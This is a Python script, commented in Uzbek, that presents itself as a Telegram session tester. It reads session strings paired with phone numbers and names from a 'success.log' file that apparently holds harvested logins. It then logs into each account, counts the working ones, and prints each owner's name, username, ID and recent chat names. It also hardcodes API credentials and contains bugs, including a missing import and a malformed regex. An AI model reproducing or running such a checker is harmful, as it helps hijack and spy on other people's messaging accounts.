#!/usr/bin/env python3
"""
Telegram sessiyalarini tekshirish uchun test skripti
"""

import asyncio
import os
import sys
from telethon import TelegramClient, errors
from telethon.sessions import StringSession
from colorama import init, Fore, Style

# Colorama ni ishga tushirish
init(autoreset=True)

# Konfiguratsiya
API_ID = 33223639
API_HASH = 'da4a254e086d07d78998b7992e64a39b'

class SessionTester:
    def __init__(self):
        self.valid_sessions = 0
        self.invalid_sessions = 0
        self.total_sessions = 0
    
    def print_banner(self):
        banner = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════╗
║         TELEGRAM SESSION TESTER v1.0                        ║
╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
        print(banner)
    
    def read_sessions_from_file(self, filename):
        """Fayldan sessiyalarni o'qish"""
        sessions = []
        
        if not os.path.exists(filename):
            print(f"{Fore.RED}✗ Fayl topilmadi: {filename}{Style.RESET_ALL}")
            return sessions
        
        with open(filename, 'r', encoding='utf-8') as f:
            content = f.read()
        
        # Sessiyalarni qidirish
        import re
        session_matches = re.findall(r'🔑 SESSIYA: (.+)', content)
        
        for i, session in enumerate(session_matches, 1):
            sessions.append({
                'id': i,
                'string': session.strip(),
                'phone': None,
                'name': None
            })
        
        return sessions
    
    def read_sessions_from_log(self, log_file="logs/success.log"):
        """Log faylidan to'liq ma'lumotlarni o'qish"""
        sessions = []
        
        if not os.path.exists(log_file):
            print(f"{Fore.YELLOW}⚠ Log fayli topilmadi, faqat sessiyalar tekshiriladi{Style.RESET_ALL}")
            return self.read_sessions_from_file("sessions.txt")
        
        with open(log_file, 'r', encoding='utf-8') as f:
            content = f.read()
        
        # Bloklarga ajratish
        blocks = re.split(r'{50,}', content)
        
        for block in blocks:
            phone = re.search(r'📞 TELEFON: (.+)', block)
            name = re.search(r'👤 ISM: (.+)', block)
            session = re.search(r'🔑 SESSIYA: (.+)', block)
            
            if session:
                sessions.append({
                    'phone': phone.group(1).strip() if phone else 'Noma\'lum',
                    'name': name.group(1).strip() if name else 'Noma\'lum',
                    'string': session.group(1).strip()
                })
        
        return sessions
    
    async def test_session(self, session_data):
        """Bitta sessiyani tekshirish"""
        self.total_sessions += 1
        
        client = TelegramClient(
            StringSession(session_data['string']),
            API_ID,
            API_HASH
        )
        
        try:
            print(f"{Fore.YELLOW}⏳ Sessiya tekshirilmoqda...{Style.RESET_ALL}", end='\r')
            
            await client.connect()
            
            if await client.is_user_authorized():
                me = await client.get_me()
                self.valid_sessions += 1
                
                # Sessiya ma'lumotlari
                phone = session_data.get('phone', me.phone or 'Noma\'lum')
                name = session_data.get('name', me.first_name)
                
                print(f"{Fore.GREEN}✅ SESSIYA ISHLADI{Style.RESET_ALL}")
                print(f"   📞 Telefon: {Fore.CYAN}{phone}{Style.RESET_ALL}")
                print(f"   👤 Ism: {Fore.CYAN}{me.first_name} {me.last_name or ''}{Style.RESET_ALL}")
                print(f"   🆔 Username: {Fore.CYAN}@{me.username if me.username else 'yoq'}{Style.RESET_ALL}")
                print(f"   🆔 ID: {Fore.CYAN}{me.id}{Style.RESET_ALL}")
                
                # Qo'shimcha ma'lumotlar
                try:
                    dialogs = await client.get_dialogs(limit=5)
                    print(f"   💬 Oxirgi chatlar: {len(dialogs)} ta")
                    for dialog in dialogs[:3]:
                        print(f"      - {dialog.name}")
                except:
                    pass
                
                return True
            else:
                self.invalid_sessions += 1
                print(f"{Fore.RED}❌ Sessiya yaroqsiz (authorized emas){Style.RESET_ALL}")
                return False
                
        except errors.rpcerrorlist.AuthKeyUnregisteredError:
            self.invalid_sessions += 1
            print(f"{Fore.RED}❌ Sessiya yaroqsiz (kalit o'chirilgan){Style.RESET_ALL}")
            return False
            
        except errors.rpcerrorlist.AuthKeyDuplicatedError:
            self.invalid_sessions += 1
            print(f"{Fore.RED}❌ Sessiya yaroqsiz (dublikat){Style.RESET_ALL}")
            return False
            
        except Exception as e:
            self.invalid_sessions += 1
            print(f"{Fore.RED}❌ Xatolik: {str(e)}{Style.RESET_ALL}")
            return False
            
        finally:
            await client.disconnect()
    
    async def run(self):
        """Asosiy funksiya"""
        self.print_banner()
        
        # Sessiyalarni o'qish
        sessions = self.read_sessions_from_log()
        
        if not sessions:
            print(f"{Fore.RED}✗ Hech qanday sessiya topilmadi!{Style.RESET_ALL}")
            return
        
        print(f"{Fore.CYAN}📊 Jami {len(sessions)} ta sessiya topildi{Style.RESET_ALL}\n")
        
        # Sessiyalarni tekshirish
        for i, session in enumerate(sessions, 1):
            print(f"{Fore.WHITE}[{i}/{len(sessions)}] Sessiya tekshirilmoqda...{Style.RESET_ALL}")
            await self.test_session(session)
            print("-" * 50)
        
        # Xulosa
        print(f"\n{Fore.CYAN}╔════════════════════════════════════════╗")
        print(f"║            TEST NATIJALARI            ║")
        print(f"╠════════════════════════════════════════╣")
        print(f"║ Jami sessiyalar: {self.total_sessions:>12}   ║")
        print(f"║ {Fore.GREEN}✓ Ishlaydiganlar{Fore.CYAN}: {self.valid_sessions:>15}   ║")
        print(f"║ {Fore.RED}✗ Yaroqsizlar{Fore.CYAN}: {self.invalid_sessions:>17}   ║")
        print(f"╚════════════════════════════════════════╝{Style.RESET_ALL}")
        
        # Natijalarni saqlash
        with open("test_results.txt", "w", encoding="utf-8") as f:
            f.write(f"Test natijalari: {datetime.now()}\n")
            f.write(f"Jami: {self.total_sessions}\n")
            f.write(f"Ishlaydigan: {self.valid_sessions}\n")
            f.write(f"Yaroqsiz: {self.invalid_sessions}\n")

async def main():
    tester = SessionTester()
    await tester.run()

if __name__ == "__main__":
    from datetime import datetime
    asyncio.run(main())